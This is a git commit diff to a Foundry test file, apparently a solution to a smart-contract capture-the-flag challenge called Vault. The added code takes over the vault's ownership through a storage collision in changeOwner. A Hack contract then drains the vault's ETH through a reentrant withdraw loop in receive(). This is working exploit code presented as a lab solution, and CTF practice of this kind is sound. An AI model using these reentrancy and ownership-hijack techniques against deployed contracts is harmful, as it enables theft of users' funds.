2a536fcc25d24bab909ab17a481e8d335d302bc7
CodingGeoff <boc_lc@126.com>
2024-08-08 15:00:51 +0800

    Update Vault.t.sol

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -31,9 +31,52 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        Hack hack = new Hack(address(vault));
+        bytes32 data = bytes32(uint256(uint160(address(logic))));
+        bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", data, address(hack));
+        address(vault).call(callData);
+        hack.enableWithdraw();
+        hack.deposit{value: 0.1 ether}();
+        hack.withdraw();
+        hack.transferETH();
+        console.log("hackerBalance", palyer.balance);
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
 
 }
+
+contract Hack {
+    address public targetAddr;
+    address private owner;
+
+    constructor(address _targetAddr) {
+        targetAddr = _targetAddr;
+        owner = msg.sender;
+    }
+
+    function deposit() public payable {
+        targetAddr.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
+    }
+
+    function enableWithdraw() public {
+        targetAddr.call(abi.encodeWithSignature("openWithdraw()"));
+    }
+
+    function withdraw() public {
+        targetAddr.call(abi.encodeWithSignature("withdraw()"));
+    }
+
+    function transferETH() public {
+        uint256 amount = address(this).balance;
+        payable(owner).call{value: amount}("");
+    }
+
+    receive() external payable {
+        if (targetAddr.balance > 0) {
+            withdraw();
+        }
+    }
+}
+
